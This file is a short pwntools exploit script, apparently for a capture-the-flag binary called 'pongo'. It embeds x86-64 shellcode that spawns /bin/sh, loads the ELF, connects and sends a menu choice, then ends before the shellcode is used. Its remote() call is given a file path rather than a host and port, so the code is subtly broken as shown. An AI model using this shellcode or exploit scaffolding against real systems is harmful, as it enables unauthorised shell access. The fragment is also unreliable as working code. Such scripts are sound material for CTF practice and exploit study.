from pwn import *

LOCAL_FILE = "./pongo.df3669a43e7b811030ce10d8090df601"
SHELLCODE = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

e = ELF(LOCAL_FILE)
r = remote(LOCAL_FILE)

r.recvuntil(b'[INPUT] >>> ')
r.sendline(b'2')
